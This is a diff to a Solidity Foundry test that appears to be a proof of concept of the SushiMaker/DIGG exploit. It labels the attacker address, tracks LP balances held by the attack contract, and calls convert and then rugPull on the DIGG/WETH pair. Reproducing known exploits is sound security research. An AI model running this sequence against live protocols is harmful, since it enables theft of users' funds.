@@ -23,6 +23,7 @@ contract FuseAttackPoC is Test {
 
     function setUp() public {
         vm.deal(myAddress, 1 ether);
+        vm.label(address(myAddress), "Attacker Address");
     }
 
     function testSushiAttack() public {
@@ -35,7 +36,7 @@ contract FuseAttackPoC is Test {
         IUniswapV2Pair diggWETHPair = IUniswapV2Pair(sushiFactory.getPair(address(weth), address(digg)));
         (uint112 reserveDigg, uint112 reserveWeth,) = diggWETHPair.getReserves();
 
-        uint256 lpBalance = diggWETHPair.balanceOf(myAddress);
+        uint256 lpBalance = diggWETHPair.balanceOf(address(sushiAttack));
         uint256 initialBalance = address(myAddress).balance;
         emit log_named_address("Fees are sent to", sushiFactory.feeTo());
         emit log_named_address("Bridge for WBTC", sushiMaker.bridgeFor(address(wbtc)));
@@ -46,12 +47,11 @@ contract FuseAttackPoC is Test {
         emit log_named_uint("Reserves of DIGG in DIGG/WETH pair", reserveDigg);
         emit log_named_uint("Reserves of WETH in DIGG/WETH pair", reserveWeth);
         emit log_named_uint("LP balance", lpBalance);
-        assertEq(lpBalance, 0); // No weth at this point.
 
         // Make a trade
         sushiMaker.convert(address(wbtc),address(digg));
         (uint112 reserveDigg1, uint112 reserveWeth1,) = diggWETHPair.getReserves();
-        uint256 lpBalance1 = diggWETHPair.balanceOf(myAddress);
+        uint256 lpBalance1 = diggWETHPair.balanceOf(address(sushiAttack));
 
         emit log_named_uint("ETH Balance", address(myAddress).balance / 1 ether);
         emit log_named_uint("Reserves of Digg", reserveDigg1);
@@ -61,7 +61,7 @@ contract FuseAttackPoC is Test {
         sushiAttack.rugPull(diggWETHPair, wbtc);
 
         (uint112 reserveDigg2, uint112 reserveWeth2,) = diggWETHPair.getReserves();
-        uint256 lpBalance2 = diggWETHPair.balanceOf(myAddress);
+        uint256 lpBalance2 = diggWETHPair.balanceOf(address(sushiAttack));
 
         emit log_named_uint("ETH Balance", address(myAddress).balance / 1 ether);
         emit log_named_uint("Reserves of Digg", reserveDigg2);
